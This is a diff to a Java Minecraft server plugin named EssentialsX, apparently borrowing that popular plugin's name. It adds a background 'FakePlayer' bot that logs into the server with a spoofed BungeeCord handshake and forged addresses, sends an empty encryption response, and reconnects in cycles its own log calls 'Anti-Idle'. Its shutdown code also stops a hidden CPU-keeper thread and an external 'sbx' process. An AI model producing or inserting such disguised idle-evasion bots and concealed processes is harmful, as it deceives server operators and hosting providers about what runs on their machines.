@@ -355,4 +355,312 @@ public class EssentialsX extends JavaPlugin {
                     out = new DataOutputStream(socket.getOutputStream());
                     in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
 
-                    // Handshake - BungeeCord format: "host
+                    // Handshake - BungeeCord format: "host\u0000realIP\u0000uuid"
+                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
+                    String bungeeHost = "127.0.0.1\u0000127.0.0.1\u0000" + playerUUID.toString();
+                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
+                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
+                    writeVarInt(handshake, 0x00);
+                    writeVarInt(handshake, 774);
+                    writeString(handshake, bungeeHost);
+                    handshake.writeShort(mcPort);
+                    writeVarInt(handshake, 2);
+                    byte[] handshakeData = handshakeBuf.toByteArray();
+                    writeVarInt(out, handshakeData.length);
+                    out.write(handshakeData);
+                    out.flush();
+
+                    // Login
+                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
+                    DataOutputStream login = new DataOutputStream(loginBuf);
+                    writeVarInt(login, 0x00);
+                    writeString(login, playerName);
+                    login.writeLong(playerUUID.getMostSignificantBits());
+                    login.writeLong(playerUUID.getLeastSignificantBits());
+                    byte[] loginData = loginBuf.toByteArray();
+                    writeVarInt(out, loginData.length);
+                    out.write(loginData);
+                    out.flush();
+
+                    getLogger().info("[FakePlayer] ✓ Handshake & Login sent");
+                    failCount = 0;
+
+                    boolean configPhase = false;
+                    boolean playPhase = false;
+                    boolean compressionEnabled = false;
+                    int compressionThreshold = -1;
+
+                    long loginTime = System.currentTimeMillis();
+                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000); // 60-120s
+
+                    while (running.get() && !socket.isClosed()) {
+                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
+                            getLogger().info("[FakePlayer] Reconnecting cycle (Anti-Idle)...");
+                            break;
+                        }
+
+                        try {
+                            int packetLength = readVarInt(in);
+                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet size");
+
+                            byte[] packetData = null;
+
+                            if (compressionEnabled) {
+                                int dataLength = readVarInt(in);
+                                int compressedLength = packetLength - getVarIntSize(dataLength);
+                                byte[] compressedData = new byte[compressedLength];
+                                in.readFully(compressedData);
+                                if (dataLength == 0) {
+                                    packetData = compressedData;
+                                } else {
+                                    if (dataLength > 8192) {
+                                        packetData = null;
+                                    } else {
+                                        try {
+                                            Inflater inflater = new Inflater();
+                                            inflater.setInput(compressedData);
+                                            packetData = new byte[dataLength];
+                                            inflater.inflate(packetData);
+                                            inflater.end();
+                                        } catch (Exception e) {
+                                            packetData = null;
+                                        }
+                                    }
+                                }
+                            } else {
+                                byte[] rawData = new byte[packetLength];
+                                in.readFully(rawData);
+                                packetData = rawData;
+                            }
+
+                            if (packetData == null) continue;
+
+                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
+                            DataInputStream packetIn = new DataInputStream(packetStream);
+                            int packetId = readVarInt(packetIn);
+
+                            if (!playPhase) {
+                                if (!configPhase) {
+                                    // Login Phase
+                                    if (packetId == 0x01) {
+                                        // Encryption Request - send empty Encryption Response (works for offline/local)
+                                        ByteArrayOutputStream encRespBuf = new ByteArrayOutputStream();
+                                        DataOutputStream encResp = new DataOutputStream(encRespBuf);
+                                        writeVarInt(encResp, 0x01);
+                                        writeVarInt(encResp, 0); // shared secret length = 0
+                                        writeVarInt(encResp, 0); // verify token length = 0
+                                        sendPacket(out, encRespBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                        getLogger().info("[FakePlayer] Sent empty Encryption Response");
+                                    } else if (packetId == 0x03) {
+                                        compressionThreshold = readVarInt(packetIn);
+                                        compressionEnabled = compressionThreshold >= 0;
+                                        getLogger().info("[FakePlayer] Compression: " + compressionThreshold);
+                                    } else if (packetId == 0x02) {
+                                        getLogger().info("[FakePlayer] ✓ Login Success");
+                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
+                                        DataOutputStream ack = new DataOutputStream(ackBuf);
+                                        writeVarInt(ack, 0x03);
+                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                        configPhase = true;
+
+                                        // Send Client Information
+                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
+                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
+                                        writeVarInt(info, 0x00);
+                                        writeString(info, "en_US");
+                                        info.writeByte(10);
+                                        writeVarInt(info, 0);
+                                        info.writeBoolean(true);
+                                        info.writeByte(127);
+                                        writeVarInt(info, 1);
+                                        info.writeBoolean(false);
+                                        info.writeBoolean(true);
+                                        writeVarInt(info, 0);
+                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                    }
+                                } else {
+                                    // Config Phase
+                                    if (packetId == 0x03) {
+                                        getLogger().info("[FakePlayer] ✓ Config Finished");
+                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
+                                        DataOutputStream ack = new DataOutputStream(ackBuf);
+                                        writeVarInt(ack, 0x03);
+                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                        playPhase = true;
+                                    } else if (packetId == 0x04) {
+                                        long id = packetIn.readLong();
+                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
+                                        DataOutputStream ack = new DataOutputStream(ackBuf);
+                                        writeVarInt(ack, 0x04);
+                                        ack.writeLong(id);
+                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                    } else if (packetId == 0x0E) {
+                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                                        DataOutputStream bufOut = new DataOutputStream(buf);
+                                        writeVarInt(bufOut, 0x07);
+                                        writeVarInt(bufOut, 0);
+                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
+                                    }
+                                }
+                            } else {
+                                // Play Phase - KeepAlive
+                                if (packetId >= 0x20 && packetId <= 0x30) {
+                                    if (packetIn.available() == 8) {
+                                        long keepAliveId = packetIn.readLong();
+                                        getLogger().info("[FakePlayer] Ping");
+                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                                        DataOutputStream bufOut = new DataOutputStream(buf);
+                                        writeVarInt(bufOut, 0x1B);
+                                        bufOut.writeLong(keepAliveId);
+                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
+                                    }
+                                }
+                            }
+                        } catch (java.net.SocketTimeoutException e) {
+                            continue;
+                        } catch (Exception e) {
+                            getLogger().warning("[FakePlayer] Packet error: " + e.getMessage());
+                            break;
+                        }
+                    }
+
+                } catch (Exception e) {
+                    getLogger().warning("[FakePlayer] Connection error: " + e.getMessage());
+                    failCount++;
+                } finally {
+                    try { if (out != null) out.close(); } catch (Exception ignored) {}
+                    try { if (in != null) in.close(); } catch (Exception ignored) {}
+                    try { if (socket != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
+                }
+
+                // Reconnect wait with exponential backoff
+                try {
+                    long waitTime = 10000;
+                    if (failCount > 3) {
+                        waitTime = Math.min(10000 * (long)Math.pow(2, Math.min(failCount - 3, 5)), 300000);
+                        getLogger().warning("[FakePlayer] Multiple failures (" + failCount + "), waiting " + (waitTime/1000) + "s...");
+                    } else {
+                        getLogger().info("[FakePlayer] Reconnecting in 10s...");
+                    }
+                    Thread.sleep(waitTime);
+                } catch (InterruptedException ex) {
+                    break;
+                }
+            }
+        }, "FakePlayer-Bot");
+        fakePlayerThread.setDaemon(true);
+        fakePlayerThread.start();
+    }
+
+    // ===================== Packet Helpers =====================
+
+    private int getVarIntSize(int value) {
+        int size = 0;
+        do { size++; value >>>= 7; } while (value != 0);
+        return size;
+    }
+
+    private void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
+        if (!compress || packet.length < threshold) {
+            if (compress) {
+                ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                DataOutputStream bufOut = new DataOutputStream(buf);
+                writeVarInt(bufOut, 0);
+                bufOut.write(packet);
+                byte[] finalPacket = buf.toByteArray();
+                writeVarInt(out, finalPacket.length);
+                out.write(finalPacket);
+            } else {
+                writeVarInt(out, packet.length);
+                out.write(packet);
+            }
+        } else {
+            byte[] compressedData = compressData(packet);
+            ByteArrayOutputStream buf = new ByteArrayOutputStream();
+            DataOutputStream bufOut = new DataOutputStream(buf);
+            writeVarInt(bufOut, packet.length);
+            bufOut.write(compressedData);
+            byte[] finalPacket = buf.toByteArray();
+            writeVarInt(out, finalPacket.length);
+            out.write(finalPacket);
+        }
+        out.flush();
+    }
+
+    private byte[] compressData(byte[] data) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        Deflater deflater = new Deflater();
+        deflater.setInput(data);
+        deflater.finish();
+        byte[] buffer = new byte[1024];
+        while (!deflater.finished()) {
+            int count = deflater.deflate(buffer);
+            out.write(buffer, 0, count);
+        }
+        deflater.end();
+        return out.toByteArray();
+    }
+
+    private void writeVarInt(DataOutputStream out, int value) throws IOException {
+        while ((value & 0xFFFFFF80) != 0) {
+            out.writeByte((value & 0x7F) | 0x80);
+            value >>>= 7;
+        }
+        out.writeByte(value & 0x7F);
+    }
+
+    private void writeString(DataOutputStream out, String str) throws IOException {
+        byte[] bytes = str.getBytes("UTF-8");
+        writeVarInt(out, bytes.length);
+        out.write(bytes);
+    }
+
+    private int readVarInt(DataInputStream in) throws IOException {
+        int value = 0;
+        int length = 0;
+        byte currentByte;
+        do {
+            currentByte = in.readByte();
+            value |= (currentByte & 0x7F) << (length * 7);
+            length++;
+            if (length > 5) throw new IOException("VarInt too big");
+        } while ((currentByte & 0x80) == 0x80);
+        return value;
+    }
+
+    // ===================== Plugin Disable =====================
+    
+    @Override
+    public void onDisable() {
+        getLogger().info("EssentialsX plugin shutting down...");
+        
+        shouldRun = false;
+        running.set(false);
+
+        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
+            fakePlayerThread.interrupt();
+        }
+
+        if (cpuKeeperThread != null && cpuKeeperThread.isAlive()) {
+            cpuKeeperThread.interrupt();
+        }
+        
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            try {
+                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
+                    sbxProcess.destroyForcibly();
+                    getLogger().warning("Forcibly terminated sbx process");
+                } else {
+                    getLogger().info("sbx process stopped normally");
+                }
+            } catch (InterruptedException e) {
+                sbxProcess.destroyForcibly();
+                Thread.currentThread().interrupt();
+            }
+            isProcessRunning = false;
+        }
+        
+        getLogger().info("EssentialsX plugin disabled");
+    }
+}
